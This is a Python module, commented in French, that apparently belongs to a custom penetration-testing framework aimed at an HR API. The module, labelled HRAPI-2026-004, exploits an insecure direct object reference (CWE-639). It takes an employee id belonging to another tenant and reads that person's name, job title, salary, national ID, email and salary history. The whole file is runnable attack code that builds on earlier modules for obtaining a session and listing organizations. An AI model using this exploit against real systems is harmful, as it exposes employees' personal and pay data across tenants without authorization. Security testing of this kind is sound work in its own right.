"""HRAPI-2026-004 — IDOR : accès à un objet d'un autre tenant par son id."""

from __future__ import annotations
from .base import Module, Option, Context


class Exploit(Module):
    id = "HRAPI-2026-004"
    name = "employees/idor_object_read"
    cwe = "CWE-639"
    cvss = "9.1 (Critique)"
    description = (
        "GET /employees/:id et /salary-history ne vérifient pas l'organisation. "
        "On récupère l'id d'un employé d'un autre tenant puis on lit sa fiche "
        "complète (identité, salaire, historique) SANS en-tête de triche."
    )
    options = {
        "empid": Option(help="id d'un employé cible (sinon auto via un autre tenant)"),
    }

    def run(self, ctx: Context) -> bool:
        access = ctx.store.get("ACCESS")
        if not access:
            ctx.fail("Pas de session. Lance d'abord HRAPI-2026-001.")
            return False

        emp_id = self.opt(ctx.store, "empid")
        if not emp_id:
            # Trouver un id dans une autre organisation via l'en-tête (002).
            orgs = ctx.store.get("ORGS", [])
            mine = ctx.store.get("SESSION_ORG")
            target = next((o for o in orgs if o.get("id") != mine), None)
            if not target:
                ctx.fail("Aucune org cible. Fais 'set empid <id>' ou lance HRAPI-2026-003.")
                return False
            rows = ctx.client.list_employees(access, org_id=target.get("id"))
            if not rows:
                ctx.fail("Impossible de récupérer un id employé.")
                return False
            emp_id = rows[0]["id"]
            ctx.info(f"Id employé d'un autre tenant ({target.get('name')}) : {emp_id}")

        # Accès direct par id, avec le contexte du tenant de l'attaquant (pas d'en-tête).
        emp = ctx.client.get_employee(access, emp_id)
        if not emp:
            ctx.fail("Fiche introuvable (faille peut-être corrigée).")
            return False
        ctx.ok("Fiche employé d'un autre tenant lue par IDOR :")
        ctx.line(f"      nom      : {emp.get('firstName')} {emp.get('lastName')}")
        ctx.line(f"      poste    : {emp.get('jobTitle')}")
        ctx.line(f"      salaire  : {emp.get('baseSalary')} {emp.get('currency')}")
        ctx.line(f"      nationalId: {emp.get('nationalId')}")
        ctx.line(f"      email    : {emp.get('email')}")
        hist = ctx.client.salary_history(access, emp_id).get("data", [])
        ctx.ok(f"Historique salarial : {len(hist)} entrée(s) accessibles.")
        return True
